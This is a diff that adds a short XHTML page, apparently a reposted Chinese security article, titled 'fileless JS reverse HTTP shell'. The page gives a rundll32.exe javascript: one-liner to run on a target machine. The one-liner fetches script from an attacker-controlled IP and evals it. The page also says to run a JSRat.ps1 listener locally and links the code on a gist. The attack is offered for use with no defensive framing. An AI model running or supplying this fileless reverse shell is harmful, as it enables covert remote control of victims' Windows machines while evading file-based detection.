@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>无文件js反弹http shell</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>无文件js反弹http shell</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzA4MDMwMjQ3Mg==&amp;mid=402163636&amp;idx=1&amp;sn=0f9c71ddc3397a3f247160c4c0df1390&amp;chksm=0daa7f533addf645da2424d864603dc8e9f9114f6722dabae60f5b2d8523a7e202c4e1b22243&amp;scene=27#wechat_redirect">http://mp.weixin.qq.com/s?__biz=MzA4MDMwMjQ3Mg==&amp;mid=402163636&amp;idx=1&amp;sn=0f9c71ddc3397a3f247160c4c0df1390&amp;chksm=0daa7f533addf645da2424d864603dc8e9f9114f6722dabae60f5b2d8523a7e202c4e1b22243&amp;scene=27#wechat_redirect</a></blockquote><p>黑科技。。。</p><p>from:http://zone.wooyun.org/content/24694</p><p>代码都在这里：<br/>https://gist.github.com/subTee/f1603fa5c15d5f8825c0<br/><br/>目标机器上执行：<br/><code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication 
+";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");
+h.Open("GET","http://反弹的IP/connect",false);h.Send();B=h.ResponseText;
+eval(B)</code><br/><br/>本地执行POWERSHELL脚本<br/>PS E:\&gt; .\JSRat.ps1<br/>注意修改PS里对应的$Server = '本地监听的IP' #Listening IP. Change This.<br/><br/>执行效果如下<br/><img data-w="" data-ratio="0.38489208633093525" data-type="png" class="" data-src="http://mmbiz.qpic.cn/mmbiz/shVkAyu04IGvr0PrmdmJrSBlORrcB3YicqibDXGMic2FJcViaqEbHpHSHQu0iaYZoYibYAY9MHwkx4Oavr9xXib6YkeHA/0?wx_fmt=png" width="640" src="../Images/5414b627a0ce1793ebac01a2c2b83a39.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/shVkAyu04IGvr0PrmdmJrSBlORrcB3YicqibDXGMic2FJcViaqEbHpHSHQu0iaYZoYibYAY9MHwkx4Oavr9xXib6YkeHA/0?wx_fmt=png"/></p>
+        
+</body>
+</html>
